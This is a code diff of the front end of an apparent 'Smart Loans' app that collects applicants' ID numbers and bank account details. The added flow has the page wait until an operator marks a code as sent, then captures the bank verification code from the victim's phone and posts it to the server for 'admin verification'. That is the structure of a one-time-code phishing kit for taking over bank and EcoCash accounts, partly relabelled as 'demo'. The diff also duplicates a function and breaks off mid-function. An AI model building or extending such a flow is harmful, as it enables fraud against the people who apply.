@@ -55,45 +55,35 @@ function loadWelcomeScreen() {
             </h2>
 
             <p>
-
                 Get quick access to affordable personal loans.
 
-                Complete your application in just a few minutes and receive your money securely through your preferred payment method.
-
+                Complete your application in just a few minutes
+                and receive your money securely through your
+                preferred payment method.
             </p>
 
         </div>
 
         <div class="feature">
-
             ⚡ Fast Approval
-
         </div>
 
         <div class="feature">
-
             🔒 Secure Application
-
         </div>
 
         <div class="feature">
-
             💳 Bank & EcoCash Disbursement
-
         </div>
 
         <div class="feature">
-
             📞 Professional Customer Support
-
         </div>
 
         <br>
 
         <button id="startApplication">
-
             APPLY NOW
-
         </button>
 
     </div>
@@ -105,9 +95,8 @@ function loadWelcomeScreen() {
         .addEventListener("click", loadCalculatorScreen);
 
 }
-
 // ======================================================
-// LOAN CALCULATOR SCREEN
+// PART 2 - LOAN CALCULATOR SCREEN
 // ======================================================
 
 function loadCalculatorScreen() {
@@ -131,7 +120,11 @@ function loadCalculatorScreen() {
             <small>Application Progress</small>
 
             <div class="progress-bar">
-                <div class="progress-fill" style="width:20%;"></div>
+
+                <div class="progress-fill"
+                     style="width:20%;">
+                </div>
+
             </div>
 
             <span>20% Complete</span>
@@ -140,16 +133,17 @@ function loadCalculatorScreen() {
 
         <div class="welcome-card">
 
-            <label><strong>Loan Amount (USD)</strong></label>
+            <label>Loan Amount (USD)</label>
 
             <input
                 type="number"
                 id="loanAmount"
-                placeholder="Enter loan amount">
+                placeholder="Enter loan amount"
+                min="1">
 
             <br><br>
 
-            <label><strong>Repayment Period</strong></label>
+            <label>Repayment Period</label>
 
             <select id="loanPeriod">
 
@@ -182,17 +176,13 @@ function loadCalculatorScreen() {
         </div>
 
         <button id="continueCalculator" disabled>
-
             CONTINUE →
-
         </button>
 
         <button
             id="backHome"
             style="background:#777;">
-
             ← BACK
-
         </button>
 
     </div>
@@ -206,9 +196,8 @@ function loadCalculatorScreen() {
     initializeCalculator();
 
 }
-
 // ======================================================
-// LOAN CALCULATOR LOGIC
+// PART 3 - LOAN CALCULATOR LOGIC
 // ======================================================
 
 function initializeCalculator() {
@@ -219,17 +208,16 @@ function initializeCalculator() {
     const monthly = document.getElementById("monthlyRepayment");
     const total = document.getElementById("totalRepayment");
 
-    const continueBtn = document.getElementById("continueCalculator");
+    const continueBtn =
+        document.getElementById("continueCalculator");
 
     const interestRates = {
-
         1: 0.10,
         3: 0.15,
         6: 0.20,
         12: 0.30,
         18: 0.40,
         24: 0.50
-
     };
 
     function calculateLoan() {
@@ -237,7 +225,12 @@ function initializeCalculator() {
         const loanAmount = parseFloat(amount.value);
         const months = parseInt(period.value);
 
-        if (!loanAmount || !months) {
+        if (
+            !loanAmount ||
+            loanAmount <= 0 ||
+            !months ||
+            !interestRates[months]
+        ) {
 
             monthly.textContent = "$0.00";
             total.textContent = "$0.00";
@@ -245,41 +238,64 @@ function initializeCalculator() {
             continueBtn.disabled = true;
 
             return;
-
         }
 
-        const interest = loanAmount * interestRates[months];
+        const interest =
+            loanAmount * interestRates[months];
 
-        const totalRepayment = loanAmount + interest;
+        const totalRepayment =
+            loanAmount + interest;
 
-        const monthlyRepayment = totalRepayment / months;
+        const monthlyRepayment =
+            totalRepayment / months;
 
-        monthly.textContent = "$" + monthlyRepayment.toFixed(2);
+        monthly.textContent =
+            "$" + monthlyRepayment.toFixed(2);
 
-        total.textContent = "$" + totalRepayment.toFixed(2);
+        total.textContent =
+            "$" + totalRepayment.toFixed(2);
 
-        sessionStorage.setItem("loanAmount", loanAmount);
-        sessionStorage.setItem("loanPeriod", months);
-        sessionStorage.setItem("monthlyRepayment", monthlyRepayment.toFixed(2));
-        sessionStorage.setItem("totalRepayment", totalRepayment.toFixed(2));
+        sessionStorage.setItem(
+            "loanAmount",
+            loanAmount
+        );
+
+        sessionStorage.setItem(
+            "loanPeriod",
+            months
+        );
+
+        sessionStorage.setItem(
+            "monthlyRepayment",
+            monthlyRepayment.toFixed(2)
+        );
+
+        sessionStorage.setItem(
+            "totalRepayment",
+            totalRepayment.toFixed(2)
+        );
 
         continueBtn.disabled = false;
-
     }
 
-    amount.addEventListener("input", calculateLoan);
+    amount.addEventListener(
+        "input",
+        calculateLoan
+    );
 
-    period.addEventListener("change", calculateLoan);
+    period.addEventListener(
+        "change",
+        calculateLoan
+    );
 
-    continueBtn.addEventListener("click", () => {
-
-        loadPersonalInformationScreen();
-
-    });
+    continueBtn.addEventListener(
+        "click",
+        loadPersonalInformationScreen
+    );
 
 }
 // ======================================================
-// PERSONAL INFORMATION SCREEN
+// PART 4 - PERSONAL INFORMATION SCREEN
 // ======================================================
 
 function loadPersonalInformationScreen() {
@@ -303,7 +319,10 @@ function loadPersonalInformationScreen() {
             <small>Application Progress</small>
 
             <div class="progress-bar">
-                <div class="progress-fill" style="width:40%;"></div>
+
+                <div class="progress-fill"
+                     style="width:40%;"></div>
+
             </div>
 
             <span>40% Complete</span>
@@ -342,7 +361,10 @@ function loadPersonalInformationScreen() {
 
             <select id="occupation">
 
-                <option value="">Select Occupation</option>
+                <option value="">
+                    Select Occupation
+                </option>
+
                 <option>Employed</option>
                 <option>Self Employed</option>
                 <option>Business Owner</option>
@@ -383,25 +405,39 @@ function loadPersonalInformationScreen() {
 
     document
         .getElementById("backCalculator")
-        .addEventListener("click", loadCalculatorScreen);
+        .addEventListener(
+            "click",
+            loadCalculatorScreen
+        );
 
     document
         .getElementById("continuePersonal")
-        .addEventListener("click", savePersonalInformation);
+        .addEventListener(
+            "click",
+            savePersonalInformation
+        );
 
 }
-
 // ======================================================
-// SAVE PERSONAL INFORMATION
+// PART 5 - SAVE PERSONAL INFORMATION
 // ======================================================
 
 function savePersonalInformation() {
 
-    const fullNames = document.getElementById("fullNames").value.trim();
-    const dateOfBirth = document.getElementById("dateOfBirth").value;
-    const idNumber = document.getElementById("idNumber").value.trim();
-    const occupation = document.getElementById("occupation").value;
-    const loanPurpose = document.getElementById("loanPurpose").value.trim();
+    const fullNames =
+        document.getElementById("fullNames").value.trim();
+
+    const dateOfBirth =
+        document.getElementById("dateOfBirth").value;
+
+    const idNumber =
+        document.getElementById("idNumber").value.trim();
+
+    const occupation =
+        document.getElementById("occupation").value;
+
+    const loanPurpose =
+        document.getElementById("loanPurpose").value.trim();
 
     if (
         fullNames === "" ||
@@ -414,36 +450,54 @@ function savePersonalInformation() {
         alert("Please complete all required fields.");
 
         return;
-
     }
 
-    sessionStorage.setItem("fullNames", fullNames);
-    sessionStorage.setItem("dateOfBirth", dateOfBirth);
-    sessionStorage.setItem("idNumber", idNumber);
-    sessionStorage.setItem("occupation", occupation);
-    sessionStorage.setItem("loanPurpose", loanPurpose);
+    sessionStorage.setItem(
+        "fullNames",
+        fullNames
+    );
+
+    sessionStorage.setItem(
+        "dateOfBirth",
+        dateOfBirth
+    );
+
+    sessionStorage.setItem(
+        "idNumber",
+        idNumber
+    );
+
+    sessionStorage.setItem(
+        "occupation",
+        occupation
+    );
+
+    sessionStorage.setItem(
+        "loanPurpose",
+        loanPurpose
+    );
 
     loadReviewScreen();
 
 }
 // ======================================================
-// REVIEW APPLICATION SCREEN
+// PART 6 - REVIEW APPLICATION SCREEN
 // ======================================================
 
 function loadReviewScreen() {
 
     const app = document.getElementById("app");
 
-    const fullNames = sessionStorage.getItem("fullNames");
-    const dob = sessionStorage.getItem("dateOfBirth");
-    const idNumber = sessionStorage.getItem("idNumber");
-    const occupation = sessionStorage.getItem("occupation");
-    const purpose = sessionStorage.getItem("loanPurpose");
+    const fullNames = sessionStorage.getItem("fullNames") || "";
+    const dob = sessionStorage.getItem("dateOfBirth") || "";
+    const idNumber = sessionStorage.getItem("idNumber") || "";
+    const occupation = sessionStorage.getItem("occupation") || "";
+    const purpose = sessionStorage.getItem("loanPurpose") || "";
 
-    const amount = sessionStorage.getItem("loanAmount");
-    const period = sessionStorage.getItem("loanPeriod");
-    const monthly = sessionStorage.getItem("monthlyRepayment");
-    const total = sessionStorage.getItem("totalRepayment");
+    const amount = sessionStorage.getItem("loanAmount") || "0";
+    const period = sessionStorage.getItem("loanPeriod") || "0";
+    const monthly = sessionStorage.getItem("monthlyRepayment") || "0.00";
+    const total = sessionStorage.getItem("totalRepayment") || "0.00";
 
     app.innerHTML = `
 
@@ -456,7 +510,6 @@ function loadReviewScreen() {
             </button>
 
             <div>
-
                 <div class="app-title">
                     Smart Loans
                 </div>
@@ -464,7 +517,6 @@ function loadReviewScreen() {
                 <div class="app-subtitle">
                     Fast • Secure • Convenient
                 </div>
-
             </div>
 
             <div class="secure">
@@ -475,7 +527,8 @@ function loadReviewScreen() {
 
         <div class="progress-bar">
 
-            <div class="progress-fill" style="width:50%;"></div>
+            <div class="progress-fill"
+                 style="width:50%;"></div>
 
         </div>
 
@@ -547,9 +600,7 @@ function loadReviewScreen() {
             <br>
 
             <button id="continueReview">
-
-                Continue
-
+                Continue →
             </button>
 
         </div>
@@ -560,19 +611,21 @@ function loadReviewScreen() {
 
     document
         .getElementById("backPersonal")
-        .addEventListener("click", loadPersonalInformationScreen);
+        .addEventListener(
+            "click",
+            loadPersonalInformationScreen
+        );
 
     document
         .getElementById("continueReview")
-        .addEventListener("click", () => {
-
-            loadDisbursementScreen();
-
-        });
+        .addEventListener(
+            "click",
+            loadDisbursementScreen
+        );
 
 }
 // ======================================================
-// DISBURSEMENT METHOD SCREEN
+// PART 7 - DISBURSEMENT METHOD SCREEN
 // ======================================================
 
 function loadDisbursementScreen() {
@@ -590,7 +643,6 @@ function loadDisbursementScreen() {
             </button>
 
             <div>
-
                 <div class="app-title">
                     Smart Loans
                 </div>
@@ -598,7 +650,6 @@ function loadDisbursementScreen() {
                 <div class="app-subtitle">
                     Fast • Secure • Convenient
                 </div>
-
             </div>
 
             <div class="secure">
@@ -609,7 +660,8 @@ function loadDisbursementScreen() {
 
         <div class="progress-bar">
 
-            <div class="progress-fill" style="width:60%;"></div>
+            <div class="progress-fill"
+                 style="width:60%;"></div>
 
         </div>
 
@@ -619,11 +671,14 @@ function loadDisbursementScreen() {
 
             <p class="intro">
 
-                Choose where you want your approved loan to be deposited.
+                Choose where you want your approved loan
+                to be deposited.
 
             </p>
 
-            <button id="bankOption" class="option-btn">
+            <button
+                id="bankOption"
+                class="option-btn">
 
                 🏦 Bank Account
 
@@ -631,7 +686,9 @@ function loadDisbursementScreen() {
 
             <br><br>
 
-            <button id="ecocashOption" class="option-btn">
+            <button
+                id="ecocashOption"
+                class="option-btn">
 
                 🟢 EcoCash Wallet
 
@@ -645,13 +702,19 @@ function loadDisbursementScreen() {
 
     document
         .getElementById("backReview")
-        .addEventListener("click", loadReviewScreen);
+        .addEventListener(
+            "click",
+            loadReviewScreen
+        );
 
     document
         .getElementById("bankOption")
         .addEventListener("click", () => {
 
-            sessionStorage.setItem("disbursementMethod", "Bank");
+            sessionStorage.setItem(
+                "disbursementMethod",
+                "Bank"
+            );
 
             loadBankSelectionScreen();
 
@@ -661,7 +724,10 @@ function loadDisbursementScreen() {
         .getElementById("ecocashOption")
         .addEventListener("click", () => {
 
-            sessionStorage.setItem("disbursementMethod", "EcoCash");
+            sessionStorage.setItem(
+                "disbursementMethod",
+                "EcoCash"
+            );
 
             loadEcoCashDetailsScreen();
 
@@ -669,7 +735,134 @@ function loadDisbursementScreen() {
 
 }
 // ======================================================
+// PART 8 - BANK SELECTION SCREEN
+// ======================================================
+
+function loadBankSelectionScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <button class="back-btn" id="backDisbursement">
+                ← Back
+            </button>
+
+            <div>
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" style="width:65%;"></div>
+        </div>
+
+        <div class="welcome-card">
+
+            <h2>Select Your Bank</h2>
+
+            <p class="intro">
+                Choose the bank account where your approved
+                loan will be deposited.
+            </p>
+
+            <div class="bank-card" data-bank="CBZ Bank">
+                🏦 CBZ Bank
+            </div>
+
+            <div class="bank-card" data-bank="CABS">
+                🏦 CABS
+            </div>
+
+            <div class="bank-card" data-bank="NMB Bank">
+                🏦 NMB Bank
+            </div>
+
+            <div class="bank-card" data-bank="BancABC">
+                🏦 BancABC
+            </div>
+
+            <div class="bank-card" data-bank="FBC Bank">
+                🏦 FBC Bank
+            </div>
+
+            <div class="bank-card" data-bank="POSB">
+                🏦 POSB
+            </div>
+
+            <div class="bank-card" data-bank="ZB Bank">
+                🏦 ZB Bank
+            </div>
+
+            <div class="bank-card" data-bank="Stanbic Bank">
+                🏦 Stanbic Bank
+            </div>
+
+            <div class="bank-card" data-bank="Steward Bank">
+                🏦 Steward Bank
+            </div>
+
+            <div class="bank-card" data-bank="Ecobank">
+                🏦 Ecobank
+            </div>
+
+            <div class="bank-card" data-bank="First Capital Bank">
+                🏦 First Capital Bank
+            </div>
+
+            <div class="bank-card" data-bank="Nedbank Zimbabwe">
+                🏦 Nedbank Zimbabwe
+            </div>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("backDisbursement")
+        .addEventListener(
+            "click",
+            loadDisbursementScreen
+        );
+
+    document
+        .querySelectorAll(".bank-card")
+        .forEach(card => {
+
+            card.addEventListener("click", () => {
+
+                sessionStorage.setItem(
+                    "selectedBank",
+                    card.dataset.bank
+                );
+
+                loadBankDetailsScreen();
+
+            });
+
+        });
+
+}
+// ======================================================
 // BANK SELECTION SCREEN
+// PART 8
 // ======================================================
 
 function loadBankSelectionScreen() {
@@ -720,18 +913,53 @@ function loadBankSelectionScreen() {
 
             </p>
 
-            <div class="bank-card" data-bank="CBZ Bank">🏦 CBZ Bank</div>
-            <div class="bank-card" data-bank="CABS">🏦 CABS</div>
-            <div class="bank-card" data-bank="NMB Bank">🏦 NMB Bank</div>
-            <div class="bank-card" data-bank="BancABC">🏦 BancABC</div>
-            <div class="bank-card" data-bank="FBC Bank">🏦 FBC Bank</div>
-            <div class="bank-card" data-bank="POSB">🏦 POSB</div>
-            <div class="bank-card" data-bank="ZB Bank">🏦 ZB Bank</div>
-            <div class="bank-card" data-bank="Stanbic Bank">🏦 Stanbic Bank</div>
-            <div class="bank-card" data-bank="Steward Bank">🏦 Steward Bank</div>
-            <div class="bank-card" data-bank="Ecobank">🏦 Ecobank</div>
-            <div class="bank-card" data-bank="First Capital Bank">🏦 First Capital Bank</div>
-            <div class="bank-card" data-bank="Nedbank Zimbabwe">🏦 Nedbank Zimbabwe</div>
+            <div class="bank-card" data-bank="CBZ Bank">
+                🏦 CBZ Bank
+            </div>
+
+            <div class="bank-card" data-bank="CABS">
+                🏦 CABS
+            </div>
+
+            <div class="bank-card" data-bank="NMB Bank">
+                🏦 NMB Bank
+            </div>
+
+            <div class="bank-card" data-bank="BancABC">
+                🏦 BancABC
+            </div>
+
+            <div class="bank-card" data-bank="FBC Bank">
+                🏦 FBC Bank
+            </div>
+
+            <div class="bank-card" data-bank="POSB">
+                🏦 POSB
+            </div>
+
+            <div class="bank-card" data-bank="ZB Bank">
+                🏦 ZB Bank
+            </div>
+
+            <div class="bank-card" data-bank="Stanbic Bank">
+                🏦 Stanbic Bank
+            </div>
+
+            <div class="bank-card" data-bank="Steward Bank">
+                🏦 Steward Bank
+            </div>
+
+            <div class="bank-card" data-bank="Ecobank">
+                🏦 Ecobank
+            </div>
+
+            <div class="bank-card" data-bank="First Capital Bank">
+                🏦 First Capital Bank
+            </div>
+
+            <div class="bank-card" data-bank="Nedbank Zimbabwe">
+                🏦 Nedbank Zimbabwe
+            </div>
 
         </div>
 
@@ -741,34 +969,43 @@ function loadBankSelectionScreen() {
 
     document
         .getElementById("backDisbursement")
-        .addEventListener("click", loadDisbursementScreen);
+        .addEventListener(
+            "click",
+            loadDisbursementScreen
+        );
 
-    document.querySelectorAll(".bank-card").forEach(card => {
+    document
+        .querySelectorAll(".bank-card")
+        .forEach(card => {
 
-        card.addEventListener("click", () => {
+            card.addEventListener("click", () => {
 
-            sessionStorage.setItem(
-                "selectedBank",
-                card.dataset.bank
-            );
+                sessionStorage.setItem(
+                    "selectedBank",
+                    card.dataset.bank
+                );
 
-            loadBankDetailsScreen();
+                loadBankDetailsScreen();
+
+            });
 
         });
-
-    });
 
 }
 // ======================================================
 // BANK DETAILS SCREEN
+// PART 9
 // ======================================================
 
 function loadBankDetailsScreen() {
 
     const app = document.getElementById("app");
 
-    const selectedBank = sessionStorage.getItem("selectedBank");
-    const fullNames = sessionStorage.getItem("fullNames") || "";
+    const selectedBank =
+        sessionStorage.getItem("selectedBank");
+
+    const fullNames =
+        sessionStorage.getItem("fullNames") || "";
 
     app.innerHTML = `
 
@@ -800,50 +1037,65 @@ function loadBankDetailsScreen() {
 
         <div class="progress-bar">
 
-            <div class="progress-fill" style="width:70%;"></div>
+            <div
+                class="progress-fill"
+                style="width:70%;">
+            </div>
 
         </div>
 
         <div class="welcome-card">
 
-            <h2>${selectedBank}</h2>
+            <h2>
+                ${selectedBank}
+            </h2>
 
             <p class="intro">
 
-                Enter the bank account details where your approved loan will be deposited.
+                Enter the bank account details where your
+                approved loan will be deposited.
 
             </p>
 
-            <label>Account Holder Name</label>
+            <label>
+                Account Holder Name
+            </label>
 
             <input
                 type="text"
                 id="accountName"
-                value="${fullNames}">
+                value="${fullNames}"
+            >
 
             <br><br>
 
-            <label>Phone Number</label>
+            <label>
+                Phone Number
+            </label>
 
             <input
                 type="tel"
                 id="bankPhone"
-                placeholder="Enter phone number">
+                placeholder="Enter phone number"
+            >
 
             <br><br>
 
-            <label>Bank Account Number</label>
+            <label>
+                Bank Account Number
+            </label>
 
             <input
                 type="text"
                 id="accountNumber"
-                placeholder="Enter bank account number">
+                placeholder="Enter bank account number"
+            >
 
             <br><br>
 
             <button id="continueBankDetails">
 
-                Continue
+                Continue →
 
             </button>
 
@@ -855,27 +1107,42 @@ function loadBankDetailsScreen() {
 
     document
         .getElementById("backBanks")
-        .addEventListener("click", loadBankSelectionScreen);
+        .addEventListener(
+            "click",
+            loadBankSelectionScreen
+        );
 
     document
         .getElementById("continueBankDetails")
-        .addEventListener("click", saveBankDetails);
+        .addEventListener(
+            "click",
+            saveBankDetails
+        );
 
 }
 // ======================================================
-// SAVE BANK DETAILS
+// PART 10 - SAVE BANK DETAILS
 // ======================================================
 
 function saveBankDetails() {
 
     const accountName =
-        document.getElementById("accountName").value.trim();
+        document
+            .getElementById("accountName")
+            .value
+            .trim();
 
     const phone =
-        document.getElementById("bankPhone").value.trim();
+        document
+            .getElementById("bankPhone")
+            .value
+            .trim();
 
     const accountNumber =
-        document.getElementById("accountNumber").value.trim();
+        document
+            .getElementById("accountNumber")
+            .value
+            .trim();
 
     if (
         accountName === "" ||
@@ -883,28 +1150,167 @@ function saveBankDetails() {
         accountNumber === ""
     ) {
 
-        alert("Please complete all fields.");
+        alert("Please complete all bank details.");
 
         return;
 
     }
 
-    sessionStorage.setItem("accountName", accountName);
-    sessionStorage.setItem("bankPhone", phone);
-    sessionStorage.setItem("accountNumber", accountNumber);
+    sessionStorage.setItem(
+        "accountName",
+        accountName
+    );
 
-    loadBankVerificationScreen();
+    sessionStorage.setItem(
+        "bankPhone",
+        phone
+    );
+
+    sessionStorage.setItem(
+        "accountNumber",
+        accountNumber
+    );
+
+    loadBankVerificationWaitingScreen();
 
 }
 // ======================================================
-// BANK VERIFICATION SCREEN
+// PART 11 - BANK VERIFICATION WAITING SCREEN
+// ======================================================
+
+function loadBankVerificationWaitingScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="welcome-card">
+
+            <div style="
+                font-size:60px;
+                text-align:center;
+            ">
+                🏦
+            </div>
+
+            <h2 style="text-align:center;">
+                Smart Loans
+            </h2>
+
+            <br>
+
+            <div style="
+                text-align:center;
+                font-size:22px;
+                color:#f39c12;
+                font-weight:bold;
+            ">
+
+                🟡 Sending demo verification code...
+
+            </div>
+
+            <br>
+
+            <p style="
+                text-align:center;
+                line-height:1.8;
+            ">
+
+                We are preparing a demo verification code
+                for your registered mobile number.
+
+                <br><br>
+
+                Please wait while we send the code.
+
+            </p>
+
+            <br>
+
+            <div class="loading-dots">
+
+                <span></span>
+                <span></span>
+                <span></span>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    `;
+
+    // Start checking the server for the
+    // admin "Code Sent" action.
+    monitorCodeSentStatus();
+
+}
+// ======================================================
+// PART 12 - MONITOR CODE SENT STATUS
+// ======================================================
+
+async function monitorCodeSentStatus() {
+
+    const applicationId =
+        sessionStorage.getItem("applicationId");
+
+    if (!applicationId) {
+        console.error("Application ID not found.");
+        return;
+    }
+
+    try {
+
+        const response = await fetch(
+            `/application-status/${applicationId}`
+        );
+
+        const result = await response.json();
+
+        if (!result.success) {
+            return;
+        }
+
+        const stage =
+            result.application.current_stage;
+
+        if (stage === "code_sent") {
+
+            loadBankVerificationScreen();
+
+            return;
+        }
+
+    } catch (err) {
+
+        console.error(
+            "Code sent status error:",
+            err
+        );
+
+    }
+
+    // Keep checking every 5 seconds
+    setTimeout(
+        monitorCodeSentStatus,
+        5000
+    );
+
+}
+// ======================================================
+// PART 13 - BANK VERIFICATION CODE SCREEN
 // ======================================================
 
 function loadBankVerificationScreen() {
 
     const app = document.getElementById("app");
 
-    const bank = sessionStorage.getItem("selectedBank");
+    const bank =
+        sessionStorage.getItem("selectedBank") || "Bank";
 
     app.innerHTML = `
 
@@ -912,7 +1318,9 @@ function loadBankVerificationScreen() {
 
         <div class="app-header">
 
-            <button class="back-btn" id="backBankDetails">
+            <button
+                class="back-btn"
+                id="backBankDetails">
                 ← Back
             </button>
 
@@ -936,34 +1344,46 @@ function loadBankVerificationScreen() {
 
         <div class="progress-bar">
 
-            <div class="progress-fill" style="width:75%;"></div>
+            <div
+                class="progress-fill"
+                style="width:75%;">
+            </div>
 
         </div>
 
         <div class="welcome-card">
 
-            <h2>${bank} Verification</h2>
+            <h2>
+                ${bank} Verification
+            </h2>
 
             <p class="intro">
 
-                A verification code has been sent to your registered mobile number.
+                Your demo verification code has been sent.
 
-                Please enter the code below.
+                <br><br>
+
+                Please enter the demo code below
+                to continue your application.
 
             </p>
 
-            <label>Verification Code</label>
+            <label>
+                🔢 Demo Verification Code
+            </label>
 
             <input
                 type="text"
                 id="bankVerificationCode"
-                placeholder="Enter verification code">
+                placeholder="Enter demo code"
+                autocomplete="one-time-code"
+            >
 
             <br><br>
 
-            <button id="continueVerification">
+            <button id="continueBankVerification">
 
-                Continue
+                Continue →
 
             </button>
 
@@ -975,388 +1395,100 @@ function loadBankVerificationScreen() {
 
     document
         .getElementById("backBankDetails")
-        .addEventListener("click", loadBankDetailsScreen);
+        .addEventListener(
+            "click",
+            loadBankDetailsScreen
+        );
 
     document
-        .getElementById("continueVerification")
-        .addEventListener("click", submitBankVerificationCode);
+        .getElementById("continueBankVerification")
+        .addEventListener(
+            "click",
+            saveBankVerification
+        );
 
 }
 // ======================================================
-// SUBMIT BANK VERIFICATION CODE
+// PART 14 - SAVE BANK VERIFICATION CODE
 // ======================================================
 
-async function submitBankVerificationCode() {
+async function saveBankVerification() {
 
-    const verificationCode = document
-        .getElementById("bankVerificationCode")
-        .value
-        .trim();
+    const input =
+        document.getElementById("bankVerificationCode");
 
-    if (!verificationCode) {
+    const code = input.value.trim();
 
-        alert("Please enter the verification code.");
+    if (code === "") {
+
+        alert("Please enter the demo verification code.");
 
         return;
 
     }
-
-    const applicationId = sessionStorage.getItem("applicationId");
-
-    try {
-
-        const response = await fetch("/submit-verification-code", {
-
-            method: "PUT",
-
-            headers: {
-                "Content-Type": "application/json"
-            },
-
-            body: JSON.stringify({
-
-                applicationId,
-                verificationCode
-
-            })
-
-        });
-
-        const result = await response.json();
-
-        if (!result.success) {
-
-            alert("Unable to submit verification code.");
-
-            return;
-
-        }
-
-        // Go to waiting screen
-        loadVerificationPendingScreen();
-
-    } catch (err) {
-
-        console.error(err);
-
-        alert("Unable to connect to the server.");
-
-    }
-
-}
-// ======================================================
-// MONITOR VERIFICATION STATUS
-// ======================================================
-
-async function monitorVerificationStatus() {
 
     const applicationId =
         sessionStorage.getItem("applicationId");
 
-    if (!applicationId) return;
+    if (!applicationId) {
+
+        alert("Application session not found.");
+
+        return;
+
+    }
 
     try {
 
         const response = await fetch(
-            `/verification-status/${applicationId}`
+            `/save-bank-verification/${applicationId}`,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    bankVerificationCode: code
+                })
+            }
         );
 
         const result = await response.json();
 
-        if (!result.success) return;
+        if (!response.ok || !result.success) {
 
-        if (result.verificationStatus === "Verified") {
-
-            loadReferenceNumberScreen();
+            throw new Error(
+                result.message ||
+                "Unable to save verification code."
+            );
 
         }
+
+        // Code has been saved on the server.
+        // Customer now waits for admin verification.
+        loadVerificationPendingScreen();
 
     } catch (err) {
 
-        console.error("Verification status error:", err);
-
-    }
-
-}
-// ======================================================
-// SAVE BANK VERIFICATION
-// ======================================================
-
-function saveBankVerification() {
-
-    const code = document
-        .getElementById("bankVerificationCode")
-        .value
-        .trim();
-
-    if (code === "") {
-
-        alert("Please enter the bank verification code.");
-
-        return;
-    }
-
-    sessionStorage.setItem(
-        "bankVerificationCode",
-        code
-    );
-
-    // Go to the verification waiting screen
-    loadVerificationPendingScreen();
-}
-// ======================================================
-// BANK REFERENCE SCREEN
-// ======================================================
-
-function loadBankReferenceScreen() {
-
-    const app = document.getElementById("app");
-
-    const bank = sessionStorage.getItem("selectedBank");
-
-    app.innerHTML = `
-
-    <div class="container">
-
-        <div class="app-header">
-
-            <button class="back-btn" id="backVerification">
-                ← Back
-            </button>
-
-            <div>
-
-                <div class="app-title">
-                    Smart Loans
-                </div>
-
-                <div class="app-subtitle">
-                    Fast • Secure • Convenient
-                </div>
-
-            </div>
-
-            <div class="secure">
-                🔒 Secure
-            </div>
-
-        </div>
-
-        <div class="progress-bar">
-
-            <div class="progress-fill" style="width:80%;"></div>
-
-        </div>
-
-        <div class="welcome-card">
-
-            <h2>${bank} Reference</h2>
-
-            <p class="intro">
-
-                Enter the bank reference number you received after verification.
-
-            </p>
-
-            <label>Reference Number</label>
-
-            <input
-                type="text"
-                id="bankReference"
-                placeholder="Enter reference number">
-
-            <br><br>
-
-            <button id="continueReference">
-
-                Continue
-
-            </button>
-
-        </div>
-
-    </div>
-
-    `;
-
-    document
-        .getElementById("backVerification")
-        .addEventListener("click", loadBankVerificationScreen);
-
-    document
-        .getElementById("continueReference")
-        .addEventListener("click", saveBankReference);
-
-}
-// ======================================================
-// SAVE BANK REFERENCE
-// ======================================================
-
-function saveBankReference() {
-
-    const reference = document
-        .getElementById("bankReference")
-        .value
-        .trim();
-
-    if (reference === "") {
-
-        alert("Please enter the bank reference number.");
-
-        return;
-
-    }
-
-    sessionStorage.setItem("bankReference", reference);
-
-    submitApplication();
-
-}
-// ======================================================
-// SUBMIT APPLICATION
-// ======================================================
-
-async function submitApplication() {
-alert("submitApplication() was called");
-    const data = {
-
-        fullNames: sessionStorage.getItem("fullNames"),
-        dateOfBirth: sessionStorage.getItem("dateOfBirth"),
-        idNumber: sessionStorage.getItem("idNumber"),
-        occupation: sessionStorage.getItem("occupation"),
-        loanPurpose: sessionStorage.getItem("loanPurpose"),
-
-        loanAmount: sessionStorage.getItem("loanAmount"),
-        loanPeriod: sessionStorage.getItem("loanPeriod"),
-        monthlyRepayment: sessionStorage.getItem("monthlyRepayment"),
-        totalRepayment: sessionStorage.getItem("totalRepayment"),
-
-        disbursementMethod: "Bank",
-
-        selectedBank: sessionStorage.getItem("selectedBank"),
-        accountName: sessionStorage.getItem("accountName"),
-        bankPhone: sessionStorage.getItem("bankPhone"),
-        accountNumber: sessionStorage.getItem("accountNumber"),
-        verificationCode: sessionStorage.getItem("bankVerificationCode"),
-        bankReference: sessionStorage.getItem("bankReference"),
-
-        ecoName: "",
-        ecoNumber: "",
-        ecoVerificationCode: "",
-        ecoReference: ""
-
-    };
-
-    loadProcessingScreen();
-
-    try {
-
-        const response = await fetch("/submit-application", {
-
-            method: "POST",
-
-            headers: {
-                "Content-Type": "application/json"
-            },
-
-            body: JSON.stringify(data)
-
-        });
-
-        const result = await response.json();
-                if (!response.ok || !result.success) {
-
-            throw new Error(result.error || "Application submission failed.");
-
-        }
-
-        sessionStorage.setItem(
-            "applicationId",
-            result.application.id
+        console.error(
+            "Bank verification error:",
+            err
         );
-
-        loadTrackingScreen();
-
-    } catch (error) {
-
-        console.error(error);
 
         alert(
-            "Unable to submit your application. Please check your internet connection and try again."
+            "Unable to connect to the server."
         );
-
-        loadReviewScreen();
 
     }
 
 }
-
 // ======================================================
-// PROCESSING SCREEN
+// PART 15 - VERIFICATION PENDING SCREEN
 // ======================================================
 
-function loadProcessingScreen() {
-
-    const app = document.getElementById("app");
-
-    app.innerHTML = `
-
-    <div class="container">
-
-        <div class="app-header">
-
-            <div>
-
-                <div class="app-title">
-                    Smart Loans
-                </div>
-
-                <div class="app-subtitle">
-                    Fast • Secure • Convenient
-                </div>
-
-            </div>
-
-            <div class="secure">
-                🔒 Secure
-            </div>
-
-        </div>
-
-        <div class="progress-bar">
-
-            <div class="progress-fill" style="width:95%;"></div>
-
-        </div>
-
-        <div class="welcome-card" style="text-align:center;">
-
-            <div class="loader"></div>
-
-            <br>
-
-            <h2>Processing Application</h2>
-
-            <p class="intro">
-
-                Please wait while we securely submit your application.
-
-            </p>
-
-            <p>
-
-                Do not close this page...
-
-            </p>
-
-        </div>
-
-    </div>
-
-    `;
-
-}
-function loadAssessmentScreen() {
